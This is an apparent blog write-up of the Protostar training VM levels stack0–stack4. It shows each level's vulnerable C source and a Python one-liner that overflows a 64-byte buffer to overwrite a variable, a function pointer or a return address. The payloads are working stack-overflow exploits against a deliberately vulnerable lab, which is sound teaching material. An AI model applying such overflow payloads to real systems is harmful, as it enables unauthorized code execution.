---
title: "Writeup: protostar (stack 0 - stack 4)"
date: 2020-12-30T21:12:45+08:00
draft: true
---

Protostar is a virtual machine which introduces the following in a friendly way: network programming, byte order, handling sockets, stack overflows, format strings, and heap overflows. It is available at [VulnHub](https://www.vulnhub.com/). 

<br>

## Stack 0

Here is some information of the executable /opt/protostar/bin/stack0. 

![](https://github.com/chuang76/image/blob/master/protostar/p0-1.PNG?raw=true)

The source code is provided as follows. 

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
    volatile int modified;
    char buffer[64];

    modified = 0;
    gets(buffer);

    if(modified != 0) {
    	printf("you have changed the 'modified' variable\n");
    } else {
    	printf("Try again?\n");
    }
}
```

So our goal is to modify an integer, just need to cover the value of buffer (64 bytes) and overwrite the value of modified (4 bytes). 

```
$ python -c "print('a' * 68)" | ./stack0
```

![](https://github.com/chuang76/image/blob/master/protostar/p0-3.PNG?raw=true)

<br>

## Stack 1

Some information of the executable /opt/protostar/bin/stack1. 

![](https://github.com/chuang76/image/blob/master/protostar/p1-1.PNG?raw=true)

The source code is available as follows. 

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
    volatile int modified;
    char buffer[64];

    if(argc == 1) {
    	errx(1, "please specify an argument\n");
    }

    modified = 0;
    strcpy(buffer, argv[1]);

    if(modified == 0x61626364) {
    	printf("you have correctly got the variable to the right value\n");
    } else {
    	printf("Try again, you got 0x%08x\n", modified);
    }
}
```

Our goal is to make the integer modified equal to 0x61626364. Note that the byte order is little-endian in the system. So the payload is

![](https://github.com/chuang76/image/blob/master/protostar/p1-2.PNG?raw=true)

or you can use \xAB notion to express the hexadecimal character. 

```
$ ./stack1 `python -c "print('a' * 64 + '\x64\x63\x62\x61')"`
```

![](https://github.com/chuang76/image/blob/master/protostar/p1-3.PNG?raw=true)

<br>

## Stack 2

Here is the information of the executable /opt/protostar/bin/stack2. 

![](https://github.com/chuang76/image/blob/master/protostar/p2-1.PNG?raw=true)

The source code is available as follows. 

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
    volatile int modified;
    char buffer[64];
    char *variable;

    variable = getenv("GREENIE");

    if(variable == NULL) {
    	errx(1, "please set the GREENIE environment variable\n");
    }

    modified = 0;

    strcpy(buffer, variable);

    if(modified == 0x0d0a0d0a) {
    	printf("you have correctly modified the variable\n");
    } else {
    	printf("Try again, you got 0x%08x\n", modified);
    }
}
```

Since the value of buffer is copied from the environment variable which we can control, let's exploit the program with the environment variable GREENIE. Again, the value of modified should be overwritten in little-endian format. 

```
$ GREENIE=`python -c "print('a' * 64 + '\x0a\x0d\x0a\x0d')"` ./stack2
```

![](https://github.com/chuang76/image/blob/master/protostar/p2-2.PNG?raw=true)

<br>

## Stack 3

Here is the information of the executable /opt/protostar/bin/stack3. 

![](https://github.com/chuang76/image/blob/master/protostar/p3-1.PNG?raw=true)

The source code is available as follows. 

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
    printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
    volatile int (*fp)();
    char buffer[64];

    fp = 0;

    gets(buffer);

    if(fp) {
    	printf("calling function pointer, jumping to 0x%08x\n", fp);
    	fp();
    }
}
```

We can use objdump command to figure out the address of the function win(). 

```
$ objdump -M intel -d stack3
```

![](https://github.com/chuang76/image/blob/master/protostar/p3-2.PNG?raw=true)

Here is the payload. 

```
$ python -c "print('a' * 64 + '\x24\x84\x04\x08')"` | ./stack3
```

![](https://github.com/chuang76/image/blob/master/protostar/p3-3.PNG?raw=true)

<br>

## Stack 4

Here is the information of the executable /opt/protostar/bin/stack4.

![](https://github.com/chuang76/image/blob/master/protostar/p4-1.PNG?raw=true) 

The source code is available as follows. 

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
    printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
    char buffer[64];
    gets(buffer);
}
```

Again, use objdump command to find out the address of the target function, i.e., 0x080483f4. 

![](https://github.com/chuang76/image/blob/master/protostar/p4-2.PNG?raw=true)

Next, let's figure out how many bytes should be covered before the return address. Set a break point at calling gets() function.

![](https://github.com/chuang76/image/blob/master/protostar/p4-6.PNG?raw=true)

As you can see, eax is stored as the start address of buffer (0xbffffca0) while current ebp is stored as 0xbffffce8. So we need to cover 0xbffffce8 - 0xbffffca0 + 4 (the size of ebp) = 76 bytes. 

![](https://github.com/chuang76/image/blob/master/protostar/p4-7.PNG?raw=true)

Here is the payload. 

```
$ python -c "print('a' * 76 + '\xf4\x83\x04\x08')"` | ./stack4
```

![](https://github.com/chuang76/image/blob/master/protostar/p4-5.PNG?raw=true)